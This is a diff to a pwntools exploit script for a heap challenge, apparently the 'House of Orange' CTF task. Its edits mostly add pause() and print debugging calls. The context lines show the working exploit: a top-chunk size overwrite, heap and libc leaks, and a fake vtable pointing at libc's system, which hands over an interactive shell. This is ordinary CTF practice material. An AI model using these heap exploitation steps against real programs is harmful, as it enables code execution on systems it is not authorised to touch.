@@ -40,8 +40,11 @@ def giveup():
 # pause()
 build(16,b'aaaaa')       #build k
 pl = b'a'*0x30 + p64(0x20) + b'\xa1\x0f\x00'
+pause()
 upgrade(0x50,pl)
+pause()
 build(0x1000,b'bbbbb')   #build 1
+pause()
 build(0x400,b'a'*8)         #build 2
 show()
 io.recvuntil(b'Name of house : ')
@@ -81,15 +84,17 @@ pl += b'\x00'*0x10
 pl += p64(heap_base + 0x5d0) #0x5d0 is the fake_vtable offset
 fake_vtable = p64(0)*3 + p64(libc_base + libc.sym['system'])
 #then the list_all will point to unsorted bin
-gdb.attach(proc.pidof(io)[0],'b *$rebase(0x0000000000000D68)')
 pl += fake_vtable
 print('before edit')
 print('len',len(pl))
-pause()
+# pause()
 upgrade(len(pl),pl)
+# gdb.attach(proc.pidof(io)[0],'b *$rebase(0x0000000000000D68)')
+print("edited")
 pause()
 io.recvuntil(b"Your choice : ")
 io.sendline(b'1')
-sleep(2)
+print("added")
+pause()
 
 io.interactive()
